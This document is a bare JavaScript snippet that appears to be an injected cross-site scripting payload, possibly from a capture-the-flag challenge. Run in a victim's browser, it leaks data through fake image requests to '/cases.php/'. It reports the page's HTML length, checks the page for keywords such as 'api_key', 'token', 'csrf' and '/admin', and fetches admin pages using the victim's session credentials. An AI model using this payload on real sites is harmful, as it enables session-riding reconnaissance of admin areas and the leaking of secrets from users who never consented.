(function(){
 var R='R9478'; var b='/cases.php/'; var img=function(s){new Image().src=b+R+'_'+s+'.css';};
 try{
  img('RAN');
  var H=(document.documentElement&&document.documentElement.outerHTML)||'';
  img('HOK_'+(H.length>0?1:0));
  var L=''+H.length; for(var d=0;d<L.length;d++) img('HL'+d+'_'+L.charAt(d));
  var kws=['action','<form','publish','seize','homepage','banner','upload','overwrite','notice','HLB2026','api_key','apikey','token','csrf','<button','/admin','textarea','contenteditable'];
  kws.forEach(function(w,i){ if(H.indexOf(w)>=0) img('HAS'+i); });
  ['/admin/index.php','/admin/review.php','/admin/search.php'].forEach(function(u,i){ fetch(u,{credentials:'include'}).then(function(r){img('AF'+i+'s'+r.status);}).catch(function(){img('AF'+i+'ERR');}); });
 }catch(e){ img('ERR'); }
})();
